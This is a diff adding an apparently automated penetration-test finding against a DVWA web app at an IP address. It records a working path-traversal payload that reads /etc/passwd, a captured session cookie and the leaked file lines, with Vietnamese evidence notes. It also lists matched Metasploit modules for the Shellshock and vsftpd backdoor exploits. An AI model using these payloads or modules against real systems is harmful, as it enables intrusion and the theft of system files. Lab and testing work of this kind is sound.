@@ -1,0 +1,15 @@
+Target: 18.143.117.224:80
+Plugin: DVWA Local File Inclusion
+CVE: DVWA-LFI
+CVSS: 7.5
+RAG matches: [{"verify_method": "http_header_inject", "cvss": "10.0", "service": "http", "description": "Shellshock bash remote code execution via HTTP headers CGI", "id": "CVE-2014-6271", "version": "bash", "exploit_module": "exploit/multi/http/apache_mod_cgi_bash_env_exec"}, {"version": "2.3.4", "verify_method": "tcp_port_6200", "cvss": "10.0", "service": "vsftpd", "id": "CVE-2011-2523", "exploit_module": "exploit/unix/ftp/vsftpd_234_backdoor", "description": "vsftpd 2.3.4 backdoor via smiley face in username opens shell port 6200"}]
+Evidence:
+Trích xuất thành công tệp hệ thống.
+      - Payload sử dụng : ?page=../../../../../../etc/passwd
+      - Session Cookie  : security=low; PHPSESSID=ol8rsvplg2i0kc8qeibudpan80
+      - Dữ liệu thu được (5 dòng đầu):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
